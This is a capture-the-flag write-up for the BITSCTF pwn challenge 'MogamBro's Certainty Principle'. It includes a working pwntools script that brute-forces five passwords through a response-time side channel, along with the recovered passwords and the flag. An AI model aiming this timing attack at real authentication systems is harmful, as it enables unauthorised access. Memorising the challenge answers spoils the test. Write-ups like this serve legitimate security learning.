# MogamBro's Certainty Principle - PWN

## Description

MogamBro's Certainty Principle states that the more accurate you are the more delay you'll face. Δt • Δp ≥ frustration / ram_space; where p is precission and t is time.

Pamdi

nc 20.244.33.146 4445

## Solution

There are no files attached to this challenge and when we netcat into the given address and post we are presented with the prompt `Enter Password:`

```bash
┌──(kali㉿kali)-[~/Desktop/mogam]
└─$ nc 20.244.33.146 4445
Enter password: asd
Incorrect password
Time taken:  8.464232490114633e-05
```

With some guessing when entering an `s` as the first character the `Time taken` changes to a value a few orders of mangnitude greater than the incorrect guess time taken.

```bash
┌──(kali㉿kali)-[~/Desktop/mogam]
└─$ nc 20.244.33.146 4445
Enter password: s
Incorrect password
Time taken:  0.100014009497734
```

We can guess that as we add more correct characters the larger the time taken will grow. Throwing together a quick python script we can brute force the password by keeping track of the difference in time taken and spit out the password when we stop receving `Incorrect Password` messages.

After letting the script run the password that is found is `sloppytoppywithatwist` which gives us this prompt:

```bash
┌──(kali㉿kali)-[~/Desktop/mogam]
└─$ nc 20.244.33.146 4445
Enter password: sloppytoppywithatwist
Congratulations! You have unlocked the door to level 2!
Enter password: 
```

So there's a second password.... This challenge is becoming less fun and more annoying. After watching the console and looking at the time deltas the precision changed and we have to modify the threshold of a correct guess time taken.

Do this 4 more times for a total of 5 password... It's stupid and it takes a few hours just to run and guess the password.

The final version of the script is below:

```python
from pwn import *
    
def range_char(start, stop):
    return (chr(n) for n in range(ord(start), ord(stop) + 1))

context.log_level = 'warn'

password = ''

totalTime = 0

looping = True

while looping:
    for c in range_char('a', 'z'):
        r = remote('20.244.33.146', 4445)

#        r.sendline(b'sloppytoppywithatwist')
#        r.recvline() #this is dumb

#        r.sendline(b'gingerdangerhermoinegranger')
#        r.recvline() #this is extra dumb

#        r.sendline(b'hickerydickerydockskibididobdobpop')
#        r.recvline() #this is extra extra dumb

#        r.sendline(b'snickersnortsupersecureshortshakingsafarisadistic')
#        r.recvline() #this is getting ridiculous

#        r.sendline(b'boompopwhizzleskizzleraptrapmeowbarkhowlbuzzdrumburpfartpoop')
#        r.recvline() # This challenge is pretty annoying

        r.sendline(str(password + c))

        msg = str(r.recvline())

        if 'Incorrect' in msg:

            time = float(str(r.recvline()).split(':')[1].strip().replace('\\n\'', ''))
            
            deltaTime = time - totalTime
            
            print(f'Time: {time}, Delta {deltaTime}, char: {c}' )
            
            if deltaTime > .001:
                password += c
                print(f'{password}')
                totalTime = time
                r.close()
                break
                
        else:
            password += c
            print(f'Password: {password}')
            looping = False
            r.close()
            break
```

Entering the 5 passwords manually give the following output and flag.

```bash
┌──(kali㉿kali)-[~/Desktop/mogam]
└─$ nc 20.244.33.146 4445
Enter password: sloppytoppywithatwist
Congratulations! You have unlocked the door to level 2!
Enter password: gingerdangerhermoinegranger
Congratulations! You have unlocked the door to level 3!
Enter password: hickerydickerydockskibididobdobpop
Congratulations! You have unlocked the door to level 4!
Enter password: snickersnortsupersecureshortshakingsafarisadistic
Congratulations! You have unlocked the door to level 5!
Enter password: boompopwhizzleskizzleraptrapmeowbarkhowlbuzzdrumburpfartpoop
Congratulations! You have unlocked all the doors. THe flag is BITSCTF{c0n6r47ul4710n5_0n_7h3_5ucc355ful_3n7ry}
```

Flag: `BITSCTF{c0n6r47ul4710n5_0n_7h3_5ucc355ful_3n7ry}`
